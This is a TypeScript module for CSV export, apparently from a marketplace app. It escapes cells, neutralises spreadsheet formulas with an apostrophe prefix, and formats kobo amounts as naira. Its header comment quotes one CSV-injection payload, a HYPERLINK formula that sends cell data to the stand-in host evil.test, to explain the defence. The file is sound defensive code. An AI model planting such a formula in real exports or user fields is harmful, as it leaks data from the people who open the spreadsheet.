/**
 * CSV serialisation.
 *
 * Two distinct jobs, and conflating them is how exports go wrong:
 *
 *   1. CSV quoting — commas, quotes and newlines, so the file parses.
 *   2. Formula neutralisation — so the file does not EXECUTE.
 *
 * The second is the security one. Excel and Google Sheets treat a cell starting
 * with =, +, - or @ as a formula. A seller controls their product titles; those
 * titles land in a CSV that a person opens on their own machine. A title of
 * `=HYPERLINK("http://evil.test?d="&A1,"Click")` turns an export into an
 * exfiltration link. Prefixing with an apostrophe is the OWASP mitigation:
 * spreadsheets treat the cell as text and hide the apostrophe.
 */

import { KOBO_PER_NAIRA, assertKobo } from '../money/kobo';

/** Leading characters a spreadsheet reads as the start of a formula. */
const FORMULA_PREFIXES = ['=', '+', '-', '@', '\t', '\r'];

const NEEDS_QUOTING = /[",\n\r]/;

export function escapeCsvCell(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return '';

  // Numbers are produced by us, not by a tenant, so they need no defusing.
  if (typeof value === 'number') return String(value);

  const needsDefusing = FORMULA_PREFIXES.some((prefix) => value.startsWith(prefix));

  // The apostrophe must live INSIDE the quotes, or the spreadsheet sees the
  // quote first and the apostrophe stops protecting anything.
  const text = needsDefusing ? `'${value}` : value;

  if (needsDefusing || NEEDS_QUOTING.test(text)) {
    return `"${text.replace(/"/g, '""')}"`;
  }

  return text;
}

/**
 * Integer kobo to a naira string with exactly two decimal places.
 *
 * Integer division throughout — dividing by 100 in floating point is how an
 * export ends up disagreeing with the ledger it came from.
 */
export function koboToNairaString(amountKobo: number): string {
  assertKobo(amountKobo, 'amountKobo');

  const negative = amountKobo < 0;
  const magnitude = Math.abs(amountKobo);
  const naira = Math.floor(magnitude / KOBO_PER_NAIRA);
  const kobo = magnitude % KOBO_PER_NAIRA;

  return `${negative ? '-' : ''}${naira}.${String(kobo).padStart(2, '0')}`;
}

export interface CsvColumn<T> {
  key: keyof T;
  header: string;
}

/**
 * Serialise rows to CSV.
 *
 * CRLF line endings: that is what RFC 4180 specifies and what Excel expects on
 * Windows, where most of these files get opened.
 */
export function toCsv<T extends Record<string, string | number | null | undefined>>(
  columns: CsvColumn<T>[],
  rows: T[],
): string {
  const lines: string[] = [columns.map((column) => escapeCsvCell(column.header)).join(',')];

  for (const row of rows) {
    lines.push(columns.map((column) => escapeCsvCell(row[column.key])).join(','));
  }

  return `${lines.join('\r\n')}\r\n`;
}
